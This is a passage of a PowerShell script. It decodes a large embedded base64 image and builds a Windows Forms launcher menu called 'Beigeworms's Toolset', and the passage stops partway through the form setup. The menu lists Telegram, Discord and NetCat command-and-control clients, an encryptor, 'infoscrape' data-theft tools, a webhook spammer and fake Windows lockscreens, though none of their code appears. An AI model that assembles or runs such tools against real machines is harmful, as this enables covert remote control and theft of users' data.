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"
$imageBytes = [Convert]::FromBase64String($base64Image)
$ms = New-Object IO.MemoryStream($imageBytes, 0, $imageBytes.Length)
$ms.Write($imageBytes, 0, $imageBytes.Length);

# Add items to the dropdown
$items = @(
"Telegram C2 Client"       
"Discord C2 Client"        
"NetCat C2 Client"         
"LAN Toolset"              
"Encryptor"                
"Decryptor"                
"Filetype Finder GUI"      
"Screen Recorder GUI"      
"Network Enumeration GUI"  
"Microphone Muter GUI"     
"Webhook Spammer GUI"      
"Social Search GUI"        
"GDI effects GUI"          
"Telegram Infoscrape"      
"Discord Infoscrape"       
"Netcat Screenshare"       
"Console MC Server Scanner"
"Console Task Manager"     
"Image To Console"         
"Matrix Cascade in console"
"Windows 10 Lockscreen"    
"Windows 11 Lockscreen"    
"Dummy Folder Creator"     
)

$form = New-Object System.Windows.Forms.Form
$form.Text = " | Beigeworms's Toolset |"
$form.Size = New-Object System.Drawing.Size(660,500)
$form.Font = 'Microsoft Sans Serif,10'
$form.BackgroundImage = [System.Drawing.Image]::FromStream($ms, $true)
$form.BackColor = "#242424"

$dropdownHeader = New-Object System.Windows.Forms.Label
$dropdownHeader.Text = "Select Tool Here"
$dropdownHeader.ForeColor = "#bcbcbc"
$dropdownHeader.AutoSize = $true
$dropdownHeader.Width = 25
$dropdownHeader.Height = 10
$dropdownHeader.Location = New-Object System.Drawing.Point(20, 10)
$form.Controls.Add($dropdownHeader)

$dropdown = New-Object System.Windows.Forms.ComboBox
$dropdown.Location = New-Object System.Drawing.Point(20, 30)
$dropdown.Size = New-Object System.Drawing.Size(250, 30)
$dropdown.Items.AddRange($items)
$form.Controls.Add($dropdown)

$WebhookInputHeader = New-Object System.Windows.Forms.Label
